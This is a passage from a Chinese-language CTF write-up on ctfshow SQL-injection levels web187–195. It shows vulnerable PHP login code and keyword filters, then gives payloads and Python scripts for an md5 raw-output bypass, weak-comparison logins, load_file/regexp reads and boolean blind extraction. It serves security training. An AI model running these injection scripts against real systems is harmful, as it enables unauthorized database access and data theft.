string">"select count(*) from ctfshow_user where username = '$username' and password= '$password'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php">    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//只有admin可以获得flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">!=</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'用户名不存在'</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到<code>md5(string,true)</code>这个函数</p><p><code>md5(string,raw)</code>其中raw参数可选，且有两种选择</p><ul><li>FALSE：32位16进制的字符串</li><li>TRUE：16位原始二进制格式的字符串</li></ul><p>当有true这个参数，会以二进制的形式输出16个字符。返回的这个原始二进制不是普通的<code>0 1</code>二进制。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210728194838783.png" alt></p><p><strong>再看下一个知识点</strong></p><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p><p><strong>构造payload</strong></p><pre><code>$sql = &quot;select count(*) from ctfshow_user where username = &#39;admin&#39; and password= &#39;ffifdyop&#39;&quot;;$sql = &quot;select count(*) from ctfshow_user where username = &#39;admin&#39; and password= &#39;&#39;or&#39;6�]��!r,��b&#39;&quot;;</code></pre><p><strong>随手写个小脚本啊：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/28 20:02</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://c523bc8a-a1eb-4c7b-81c2-915c52efa9bb.challenge.ctf.show:8080/select-waf.php'</span>url2 <span class="token operator">=</span> <span class="token string">' http://c523bc8a-a1eb-4c7b-81c2-915c52efa9bb.challenge.ctf.show:8080/api/'</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"ffifdyop"</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#r = requests.post(url=url,data=payload)</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url2<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web188——MySQL中的弱比较"><a href="#web188——MySQL中的弱比较" class="headerlink" title="web188——MySQL中的弱比较"></a>web188——MySQL中的弱比较</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = {$username}"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//用户名检测</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'用户名非法'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//密码检测</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'密码只能为数字'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//密码判断</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'登陆成功'</span><span class="token punctuation">;</span>      <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>mysql中字母与数字的比较过程：</strong></p><p>你可以尝试一下在数据库中使用这样的语句：<br><code>select * from stu where name=0</code>很有可能是能查询出东西的，即使你没有name为0的数据</p><p>这是因为数据库进行了弱比较，它<strong>select出所有name是以字母为开头的数据</strong><br>以字母为开头的字符型数据在与数字型比较时，会强制转化为0，再与数字比较（这里很类似于PHP的弱比较）<br>假设我们username为0，那么就会相等，从而匹配成功</p><p>在这里的password是用0来混字母开头的<code>$row[&#39;pass&#39;]</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/28 20:02</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'challenge.ctf.show:8080/api/'</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">#"username":"1||1",</span>    <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">}</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-7-30"><a href="#2021-7-30" class="headerlink" title="2021-7-30"></a>2021-7-30</h1><h1 id="web189——load-file结合regexp盲注"><a href="#web189——load-file结合regexp盲注" class="headerlink" title="web189——load_file结合regexp盲注"></a>web189——<code>load_file</code>结合<code>regexp</code>盲注</h1><p>hints：flag在api/<strong>index</strong>.php文件中</p><p><a href="https://www.cnblogs.com/blacksunny/p/8060028.html" target="_blank" rel="noopener">mysql load_file在数据库注入中使用</a></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/30 15:48</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> jsonurl <span class="token operator">=</span> <span class="token string">'http://6ef6bc21-0110-4f40-bb9e-d260d53faac1.challenge.ctf.show:8080/api/index.php'</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow{'</span>letter <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz-{}'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(load_file('/var/www/html/api/index.php')regexp('{}'),0,1)"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"0"</span>        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(r)</span>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token string">'}'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>是否注入成功利用的是mysql中的弱比较的返回值“密码错误”</p><h1 id="web190——bool盲注"><a href="#web190——bool盲注" class="headerlink" title="web190——bool盲注"></a>web190——bool盲注</h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = '{$username}'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//密码检测</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'密码只能为数字'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//密码判断</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'登陆成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//TODO:感觉少了个啥，奇怪</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>python脚本</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/30 16:16</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://ba83b7e4-1f63-428d-aa58-589b7afe233a.challenge.ctf.show:8080/api/'</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># 查数据库</span>        payload <span class="token operator">=</span> <span class="token string">"database()"</span>        <span class="token comment" spellcheck="true"># 查表</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment" spellcheck="true"># 查字段</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment" spellcheck="true"># 查flag</span>        <span class="token comment" spellcheck="true">#payload = "select group_concat(f1ag) from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> f<span class="token string">"admin' and if(ascii(substr(({payload}),{i},1))>{mid},1,0)='1"</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span>  <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web191——ord代替ascii"><a href="#web191——ord代替ascii" class="headerlink" title="web191——ord代替ascii"></a>web191——ord代替ascii</h1><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//密码检测</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'密码只能为数字'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//密码判断</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'登陆成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//TODO:感觉少了个啥，奇怪</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/file|into|ascii/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'用户名非法'</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将190脚本修改即可</p><h1 id="web192——bool盲注"><a href="#web192——bool盲注" class="headerlink" title="web192——bool盲注"></a>web192——bool盲注</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/7/30 16:16</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://ba83b7e4-1f63-428d-aa58-589b7afe233a.challenge.ctf.show:8080/api/'</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># 查数据库</span>        payload <span class="token operator">=</span> <span class="token string">"database()"</span>        <span class="token comment" spellcheck="true"># 查表</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment" spellcheck="true"># 查字段</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment" spellcheck="true"># 查flag</span>        <span class="token comment" spellcheck="true">#payload = "select group_concat(f1ag) from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> f<span class="token string">"admin' and if(ascii(substr(({payload}),{i},1))>{mid},1,0)='1"</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span>  <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web193——bool盲注"><a href="#web193——bool盲注" class="headerlink" title="web193——bool盲注"></a>web193——bool盲注</h1><p>禁用substr</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/8/3 16:46</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> sysurl <span class="token operator">=</span> <span class="token string">'http://955bf0a2-3516-4e57-9534-f5029f4ada04.challenge.ctf.show:8080/api/'</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow{'</span>letter <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz-_,{}'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"' or if((select group_concat(f1ag) from ctfshow_flxg) like '{}',1,0) ='1"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">"%"</span><span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token number">1</span>        <span class="token punctuation">}</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web194——bool盲注、LOCATE"><a href="#web194——bool盲注、LOCATE" class="headerlink" title="web194——bool盲注、LOCATE"></a>web194——bool盲注、<code>LOCATE</code></h1><p>用到了<code>locate</code></p><p><code>LOCATE(substr,string)</code><br>返回字符串<code>string</code>中<strong>第一次</strong>出现子字符串的位置 <code>subtr</code>，从1开始计数<br>例如：SELECT LOCATE(‘2’, ‘123’) 返回 2</p><p><strong>payload：</strong></p><p><code>payload=&quot;&#39; or if((locate(&#39;{}&#39;,(select group_concat(f1ag) from ctfshow_flxg limit 0,1))=1),1,2)=&#39;1&quot;.format(flag+j)</code></p><p>接下来一个括号一个括号的分析：</p><p><code>select group_concat(f1ag) from ctfshow_flxg limit 0,1</code>=ctfshow{123456789}</p><p><code>locate(&#39;ctfshow{&#39;,(ctfshow{123456789}))=1</code></p><p>剩下if 就不解释了，可以本地试一下</p><p>更换上题脚本的payload即可</p><h1 id="web195——堆叠注入、UPDATE"><a href="#web195——堆叠注入、UPDATE" class="headerlink" title="web195——堆叠注入、UPDATE"></a>web195——堆叠注入、<code>UPDATE</code></h1><p><strong>查询语句</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = {$username};"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>返回逻辑</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//密码检测</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'密码只能为数字'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//密码判断</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'登陆成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'用户名非法'</span><span class="token 